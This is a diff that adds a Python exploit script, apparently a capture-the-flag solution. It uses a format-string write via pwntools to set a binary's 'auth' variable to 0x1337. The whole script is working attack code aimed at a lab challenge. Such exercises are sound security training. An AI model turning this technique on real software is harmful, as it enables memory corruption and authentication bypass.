@@ -1,0 +1,71 @@
+```python
+import argparse
+import subprocess
+import struct
+import sys
+import os
+from pwn import fmtstr_payload
+
+def main():
+    parser = argparse.ArgumentParser(description="Exploit for format_string challenge.")
+    parser.add_argument("binary", nargs="?", default=None, help="Path to the target binary.")
+    parser.add_argument("--binary", dest="binary_flag", default=None, help="Path to the target binary (alternative).")
+    args = parser.parse_args()
+    binary_path = args.binary_flag or args.binary
+    if not binary_path:
+        print("Error: Missing binary path.", file=sys.stderr)
+        sys.exit(1)
+
+    # Ensure the binary path is absolute for consistent execution
+    binary_path = os.path.abspath(binary_path)
+
+    # --- Exploit Details from Analysis ---
+    # The 'auth' global variable is at address 0x40406c.
+    # We need to set it to 0x1337 (4919 decimal).
+    AUTH_ADDR = 0x40406c
+    TARGET_VALUE = 0x1337 # 4919
+
+    # Determine the stack offset for the format string vulnerability.
+    # From `run_with_stdin` output with `AAAA.%p...`, `AAAA` (0x41414141) appears
+    # as part of the 6th argument (e.g., `0x2e70252e41414141` where `41414141` is `AAAA`).
+    # This indicates that our input buffer starts at the 6th argument on the stack.
+    FMT_OFFSET = 6
+
+    # Use pwntools to craft the format string payload.
+    # We want to write TARGET_VALUE to AUTH_ADDR.
+    # 'short' write size (%hn) is sufficient for 0x1337 (which is less than 0xFFFF).
+    # The fmtstr_payload function will place AUTH_ADDR at the beginning of the payload
+    # and then use %<offset>$hn to write to it, automatically calculating the padding.
+    payload = fmtstr_payload(FMT_OFFSET, {AUTH_ADDR: TARGET_VALUE}, write_size='short')
+
+    # Set the current working directory.
+    # Prefer TARGET_RUNTIME_DIR if available, otherwise use the directory of the binary.
+    # This is important if sidecar files like 'flag.txt' are expected in the runtime directory.
+    runtime_dir = os.environ.get('TARGET_RUNTIME_DIR', os.path.dirname(binary_path))
+    
+    # Execute the binary with the crafted payload as stdin.
+    # Use subprocess.run to capture stdout and stderr.
+    # `input` expects bytes, and `text=False` ensures output is also handled as bytes.
+    try:
+        process = subprocess.run(
+            [binary_path],
+            input=payload,
+            capture_output=True,
+            text=False,
+            cwd=runtime_dir
+        )
+
+        # Print the captured stdout and stderr.
+        sys.stdout.buffer.write(process.stdout)
+        sys.stderr.buffer.write(process.stderr)
+
+    except FileNotFoundError:
+        print("Error: Binary not found at {}".format(binary_path), file=sys.stderr)
+        sys.exit(1)
+    except Exception as e:
+        print("An error occurred: {}".format(e), file=sys.stderr)
+        sys.exit(1)
+
+if __name__ == '__main__':
+    main()
+```
